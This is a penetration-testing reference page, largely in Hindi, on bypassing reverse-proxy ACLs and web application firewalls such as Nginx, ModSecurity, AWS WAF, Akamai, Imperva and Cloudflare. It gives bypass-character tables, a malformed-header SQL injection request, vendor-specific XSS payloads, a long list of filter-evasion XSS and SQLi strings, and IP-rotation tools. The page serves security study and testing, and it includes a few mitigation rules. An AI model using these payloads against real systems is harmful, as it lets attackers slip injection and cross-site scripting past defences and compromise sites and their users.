# Proxy / WAF Protections Bypass

{{#include ../banners/hacktricks-training.md}}


## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

तकनीकें [इस शोध से](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx नियम का उदाहरण:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Nginx बायपास को रोकने के लिए पथ सामान्यीकरण करता है। हालाँकि, यदि बैकएंड सर्वर एक अलग सामान्यीकरण करता है (ऐसे वर्णों को हटाना जो nginx नहीं हटाता) तो इस रक्षा को बायपास करना संभव हो सकता है।

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM कॉन्फ़िगरेशन:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx को `/admin.php` तक पहुँच को ब्लॉक करने के लिए कॉन्फ़िगर किया गया है लेकिन इसे `/admin.php/index.php` तक पहुँचकर बायपास करना संभव है।

### रोकने के तरीके
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security नियमों को बायपास करें <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### पथ भ्रम

[**इस पोस्ट में**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) बताया गया है कि ModSecurity v3 (3.0.12 तक), **`REQUEST_FILENAME`** वेरिएबल को गलत तरीके से लागू किया गया था, जिसे एक्सेस किए गए पथ (पैरामीटर की शुरुआत तक) को शामिल करना था। इसका कारण यह है कि इसने पथ प्राप्त करने के लिए एक URL डिकोड किया।\
इसलिए, एक अनुरोध जैसे `http://example.com/foo%3f';alert(1);foo=` में मोड सुरक्षा यह मान लेगी कि पथ केवल `/foo` है क्योंकि `%3f` को `?` में परिवर्तित किया गया है जो URL पथ को समाप्त करता है, लेकिन वास्तव में सर्वर को प्राप्त होने वाला पथ `/foo%3f';alert(1);foo=` होगा।

वेरिएबल `REQUEST_BASENAME` और `PATH_INFO` भी इस बग से प्रभावित हुए थे।

Mod Security के संस्करण 2 में कुछ समान हुआ जिसने एक सुरक्षा को बायपास करने की अनुमति दी जो उपयोगकर्ता को बैकअप फ़ाइलों से संबंधित विशिष्ट एक्सटेंशन वाली फ़ाइलों तक पहुँचने से रोकती थी (जैसे `.bak`) बस डॉट को `%2e` में URL एन्कोड करके भेजकर, उदाहरण के लिए: `https://example.com/backup%2ebak`।

## AWS WAF ACL को बायपास करें <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### गलत फ़ॉर्मेटेड हेडर

[यह शोध](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) बताता है कि HTTP हेडर पर लागू AWS WAF नियमों को बायपास करना संभव था एक "गलत फ़ॉर्मेटेड" हेडर भेजकर जिसे AWS द्वारा सही तरीके से पार्स नहीं किया गया लेकिन बैकएंड सर्वर द्वारा किया गया।

उदाहरण के लिए, हेडर X-Query में SQL इंजेक्शन के साथ निम्नलिखित अनुरोध भेजना:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
यह AWS WAF को बायपास करना संभव था क्योंकि यह नहीं समझता था कि अगली पंक्ति हेडर के मान का हिस्सा है जबकि NODEJS सर्वर ने ऐसा किया (इसका समाधान किया गया)।

## सामान्य WAF बायपास

### अनुरोध आकार सीमाएँ

आम तौर पर WAFs के पास अनुरोधों की जांच के लिए एक निश्चित लंबाई सीमा होती है और यदि POST/PUT/PATCH अनुरोध इससे अधिक है, तो WAF अनुरोध की जांच नहीं करेगा।

- AWS WAF के लिए, आप [**दस्तावेज़ देखें**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>ऐप्लिकेशन लोड बैलेंसर और AWS AppSync सुरक्षा के लिए निरीक्षण किया जा सकने वाले वेब अनुरोध शरीर का अधिकतम आकार</td><td>8 KB</td></tr><tr><td>CloudFront, API गेटवे, Amazon Cognito, App Runner, और Verified Access सुरक्षा के लिए निरीक्षण किया जा सकने वाले वेब अनुरोध शरीर का अधिकतम आकार**</td><td>64 KB</td></tr></tbody></table>

- [**Azure दस्तावेज़ों से**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

पुराने वेब एप्लिकेशन फ़ायरवॉल जिनमें कोर नियम सेट 3.1 (या उससे कम) है,  **128 KB** से बड़े संदेशों की अनुमति देते हैं, लेकिन ये संदेश कमजोरियों के लिए जांचे नहीं जाएंगे। नए संस्करणों (कोर नियम सेट 3.2 या नए) के लिए, अधिकतम अनुरोध शरीर सीमा को अक्षम करके यही किया जा सकता है। जब एक अनुरोध आकार सीमा को पार करता है:

यदि **रोकथाम मोड**: अनुरोध को लॉग करता है और ब्लॉक करता है।\
यदि **पता लगाने का मोड**: सीमा तक निरीक्षण करता है, बाकी को अनदेखा करता है, और यदि `Content-Length` सीमा को पार करता है तो लॉग करता है।

- [**Akamai से**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

डिफ़ॉल्ट रूप से, WAF केवल अनुरोध के पहले 8KB का निरीक्षण करता है। यह उन्नत मेटाडेटा जोड़कर सीमा को 128KB तक बढ़ा सकता है।

- [**Cloudflare से**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

128KB तक।

### ओबफस्केशन <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode संगतता <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode सामान्यीकरण के कार्यान्वयन के आधार पर (अधिक जानकारी [यहाँ](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), ऐसे वर्ण जो Unicode संगतता साझा करते हैं, WAF को बायपास करने और इच्छित पेलोड के रूप में निष्पादित करने में सक्षम हो सकते हैं। संगत वर्ण [यहाँ](https://www.compart.com/en/unicode) पाए जा सकते हैं।

#### उदाहरण <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### संदर्भ WAFs को एन्कोडिंग के साथ बायपास करें <a href="#ip-rotation" id="ip-rotation"></a>

जैसा कि [**इस ब्लॉग पोस्ट**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) में उल्लेख किया गया है, उपयोगकर्ता इनपुट के संदर्भ को बनाए रखने में सक्षम WAFs को बायपास करने के लिए, हम WAF तकनीकों का दुरुपयोग कर सकते हैं ताकि वास्तव में उपयोगकर्ताओं के इनपुट को सामान्य किया जा सके।

उदाहरण के लिए, पोस्ट में उल्लेख किया गया है कि **Akamai ने एक उपयोगकर्ता इनपुट को 10 बार URL डिकोड किया**। इसलिए कुछ ऐसा जैसे `<input/%2525252525252525253e/onfocus` को Akamai द्वारा `<input/>/onfocus` के रूप में देखा जाएगा, जो **सोच सकता है कि यह ठीक है क्योंकि टैग बंद है**। हालाँकि, जब तक एप्लिकेशन इनपुट को 10 बार URL डिकोड नहीं करता, पीड़ित कुछ ऐसा देखेगा जैसे `<input/%25252525252525253e/onfocus` जो **XSS हमले के लिए अभी भी मान्य है**।

इसलिए, यह **एन्कोडेड घटकों में पेलोड्स को छिपाने की अनुमति देता है** जिसे WAF डिकोड और व्याख्या करेगा जबकि पीड़ित नहीं करेगा।

इसके अलावा, यह केवल URL एन्कोडेड पेलोड्स के साथ ही नहीं बल्कि अन्य एन्कोडिंग जैसे यूनिकोड, हेक्स, ऑक्टल के साथ भी किया जा सकता है...

पोस्ट में निम्नलिखित अंतिम बायपास का सुझाव दिया गया है:

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

यह भी उल्लेख किया गया है कि **कुछ WAFs उपयोगकर्ता इनपुट के संदर्भ को कैसे समझते हैं** के आधार पर, इसका दुरुपयोग करना संभव हो सकता है। ब्लॉग में प्रस्तावित उदाहरण यह है कि Akamai ने `/*` और `*/` के बीच कुछ भी डालने की अनुमति दी (संभवतः क्योंकि इसका उपयोग सामान्यतः टिप्पणियों के रूप में किया जाता है)। इसलिए, एक SQLinjection जैसे `/*'or sleep(5)-- -*/` को पकड़ा नहीं जाएगा और यह मान्य होगा क्योंकि `/*` इंजेक्शन की प्रारंभिक स्ट्रिंग है और `*/` टिप्पणी की गई है।

इस प्रकार की संदर्भ समस्याओं का उपयोग **अन्य कमजोरियों का दुरुपयोग करने के लिए भी किया जा सकता है** जो WAF द्वारा शोषित होने की अपेक्षा की जाती है (जैसे, इसका उपयोग XSS को शोषित करने के लिए भी किया जा सकता है)।

### H2C स्मगलिंग <a href="#ip-rotation" id="ip-rotation"></a>

{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP रोटेशन <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf के साथ उपयोग के लिए एक API गेटवे URL उत्पन्न करें
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox के समान
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite प्लगइन जो API गेटवे IPs का उपयोग करता है
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): एक गतिशील रूप से निर्धारित संख्या में कंटेनर उदाहरणों को इनपुट फ़ाइल के आकार और विभाजन कारक के आधार पर सक्रिय किया जाता है, जिसमें इनपुट को समानांतर निष्पादन के लिए टुकड़ों में विभाजित किया जाता है, जैसे 100 उदाहरण 10,000-लाइन इनपुट फ़ाइल से 100 टुकड़ों को संसाधित करते हैं जिसमें विभाजन कारक 100 पंक्तियाँ हैं।
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex बायपास

फायरवॉल पर regex फ़िल्टर को बायपास करने के लिए विभिन्न तकनीकों का उपयोग किया जा सकता है। उदाहरणों में केस को वैकल्पिक करना, लाइन ब्रेक जोड़ना, और पेलोड्स को एन्कोड करना शामिल हैं। विभिन्न बायपास के लिए संसाधन [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) और [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) पर पाए जा सकते हैं। नीचे दिए गए उदाहरण [इस लेख](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) से लिए गए हैं।
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Tools

- [**nowafpls**](https://github.com/assetnote/nowafpls): Burp प्लगइन जो लंबाई के द्वारा WAFs को बायपास करने के लिए अनुरोधों में जंक डेटा जोड़ता है

## References

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)


{{#include ../banners/hacktricks-training.md}}
